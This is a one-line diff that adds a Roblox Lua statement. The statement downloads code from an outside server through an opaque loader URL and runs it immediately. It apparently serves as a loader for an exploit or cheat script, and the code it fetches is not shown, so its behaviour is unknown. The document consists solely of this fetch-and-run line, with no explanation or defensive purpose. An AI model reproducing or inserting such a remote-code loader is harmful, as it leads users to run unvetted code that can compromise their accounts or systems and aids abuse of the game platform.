@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.aziroxdevelopment.online/loaders/v3/212a28d28795f54e8b1247b8a82e29f3c20d8aaf606b98f496e8cea9f1ed3f751705270728540319783700ec86000df1ab9b571ac44c89fc9fcd251fbba30c883fe444ee3a8d6932fbb52a65c40f7c01e55d0129"))()
